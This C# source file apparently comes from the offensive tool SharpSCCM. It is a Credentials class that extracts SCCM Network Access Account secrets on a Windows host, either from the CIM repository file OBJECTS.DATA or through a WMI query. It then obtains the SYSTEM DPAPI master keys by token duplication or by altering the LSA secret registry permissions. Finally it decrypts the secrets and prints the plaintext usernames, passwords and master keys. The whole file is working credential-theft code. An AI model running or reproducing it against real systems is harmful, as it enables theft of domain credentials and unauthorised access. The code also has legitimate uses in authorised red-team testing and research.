using System;
using System.Collections.Generic;
using System.IO;
using System.Management;
using System.Text;
using System.Text.RegularExpressions;

namespace SharpSCCM
{
    public class Credentials
    {
        public static void LocalNetworkAccessAccountsDisk(bool reg = false)
        {
            // Thanks to @guervild on GitHub for contributing this code to SharpDPAPI

            Console.WriteLine($"[*] Retrieving Network Access Account blobs from CIM repository");

            string fileData = "";
            MemoryStream ms = new MemoryStream();

            // Path of the CIM repository
            string path = "";

            if (!System.Environment.Is64BitProcess)
            {
                path = $"{Environment.GetEnvironmentVariable("SystemDrive")}\\Windows\\Sysnative\\Wbem\\Repository\\OBJECTS.DATA";
            }
            else
            {
                path = $"{Environment.GetEnvironmentVariable("SystemDrive")}\\Windows\\System32\\Wbem\\Repository\\OBJECTS.DATA";
            }

            if (File.Exists(path))
            {
                using (FileStream fs = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                using (var sr = new StreamReader(fs, Encoding.Default))
                {
                    fileData = sr.ReadToEnd();
                }

                Regex regexData = new Regex(@"CCM_NetworkAccessAccount.*<PolicySecret Version=""1""><!\[CDATA\[(.*?)\]\]><\/PolicySecret>.*<PolicySecret Version=""1""><!\[CDATA\[(.*?)\]\]><\/PolicySecret>", RegexOptions.Multiline | RegexOptions.IgnoreCase | RegexOptions.Compiled);
                var matchesData = regexData.Matches(fileData);

                if (matchesData.Count <= 0)
                {
                    Console.WriteLine("\r\n[X] No \"NetworkAccessAccount\" match found.");
                }

                if (Helpers.IsHighIntegrity())
                {
                    Dictionary<string, string> masterkeys;
                    if (reg)
                    {
                        // Triage system master keys by modifying LSA secret registry key permissions
                        masterkeys = Dpapi.TriageSystemMasterKeys(false, reg);
                    }

                    else
                    {
                        // Triage system master keys by elevating to system via token duplication
                        masterkeys = Dpapi.TriageSystemMasterKeys();

                    }

                    Console.WriteLine("\r\n[*] SYSTEM master key cache:\r\n");
                    foreach (KeyValuePair<string, string> kvp in masterkeys)
                    {
                        Console.WriteLine("{0}:{1}", kvp.Key, kvp.Value);
                    }

                    for (int index = 0; index < matchesData.Count; index++)
                    {

                        for (int idxGroup = 1; idxGroup < matchesData[index].Groups.Count; idxGroup++)
                        {
                            try
                            {
                                string naaPlaintext = "";
                                Console.WriteLine(
                                    "\r\n[*] Triaging SCCM Network Access Account Credentials from CIM Repository\r\n");
                                naaPlaintext = Dpapi.Execute(matchesData[index].Groups[idxGroup].Value, masterkeys);
                                Console.WriteLine("     Plaintext NAA   : {0}", naaPlaintext);
                                Console.WriteLine();
                            }
                            catch (Exception e)
                            {
                                Console.WriteLine("[!] Data was not decrypted. An error occurred.");
                                Console.WriteLine(e.ToString());
                            }
                        }
                    }
                }
                else
                {
                    Console.WriteLine("\r\n[X] You must be elevated to retrieve masterkeys.\r\n");
                }
            }
            else
            {
                Console.WriteLine("\r\n[X] OBJECTS.DATA does not exist or is not readable.\r\n");
            }
        }

        public static void LocalNetworkAccessAccountsWmi(bool reg = false)
        {
            if (Helpers.IsHighIntegrity())
            {
                Console.WriteLine($"[*] Retrieving Network Access Account blobs via WMI\n");
                ManagementScope wmiConnection = MgmtUtil.NewWmiConnection("localhost", "root\\ccm\\policy\\Machine\\ActualConfig");
                //MgmtUtil.GetClassInstances(wmiConnection, "CCM_NetworkAccessAccount");
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(wmiConnection, new ObjectQuery("SELECT * FROM CCM_NetworkAccessAccount"));
                ManagementObjectCollection accounts = searcher.Get();
                if (accounts.Count > 0)
                {
                    foreach (ManagementObject account in accounts)
                    {
                        string protectedUsername = account["NetworkAccessUsername"].ToString().Split('[')[2].Split(']')[0];
                        string protectedPassword = account["NetworkAccessPassword"].ToString().Split('[')[2].Split(']')[0];

                        byte[] protectedUsernameBytes = Helpers.StringToByteArray(protectedUsername);
                        int length = (protectedUsernameBytes.Length + 16 - 1) / 16 * 16;
                        Array.Resize(ref protectedUsernameBytes, length);

                        Dictionary<string, string> masterkeys;
                        if (reg)
                        {
                            // Triage system master keys by modifying LSA secret registry key permissions
                            masterkeys = Dpapi.TriageSystemMasterKeys(false, reg);
                        }

                        else
                        {
                            // Triage system master keys by elevating to system via token duplication
                            masterkeys = Dpapi.TriageSystemMasterKeys();

                        }



                        Console.WriteLine("\r\n[*] SYSTEM master key cache:\r\n");
                        foreach (KeyValuePair<string, string> kvp in masterkeys)
                        {
                            Console.WriteLine("{0}:{1}", kvp.Key, kvp.Value);
                        }
                        Console.WriteLine();

                        try
                        {
                            string username = Dpapi.Execute(protectedUsername, masterkeys);
                            string password = Dpapi.Execute(protectedPassword, masterkeys);

                            if (username.StartsWith("00 00 0E 0E 0E") || password.StartsWith("00 00 0E 0E 0E"))
                            {
                                Console.WriteLine("\r\n[!] SCCM is configured to use the client's machine account instead of NAA\r\n");
                            }
                            else
                            {
                                Console.WriteLine("\r\n[*] Triaging Network Access Account Credentials\r\n");
                                Console.WriteLine("     Plaintext NAA Username         : {0}", username);
                                Console.WriteLine("     Plaintext NAA Password         : {0}\n", password);
                            }
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("[!] Data was not decrypted. An error occurred.");
                            Console.WriteLine(e.ToString());
                        }
                    }
                }
                else
                {
                    Console.WriteLine($"[+] Found 0 instances of CCM_NetworkAccessAccount.\n");
                    Console.WriteLine($"[+] \n");
                    Console.WriteLine($"[+] This could mean one of three things:\n");
                    Console.WriteLine($"[+]    1. The SCCM environment does not have a Network Access Account configured\n");
                    Console.WriteLine($"[+]    2. This host is not an SCCM client (and never has been)\n");
                    Console.WriteLine($"[+]    3. This host is no longer an SCCM client (but used to be)\n");
                    Console.WriteLine($"[+] You can attempt running 'SharpSCCM local naa disk' to retrieve NAA credentials from machines\n");
                    Console.WriteLine($"[+] that used to be SCCM clients but have since had the client uninstalled.");
                }
            }
            else
            {
                Console.WriteLine("[!] SharpSCCM must be run elevated to retrieve the NAA blobs via WMI.\n");
            }
        }
    }
}
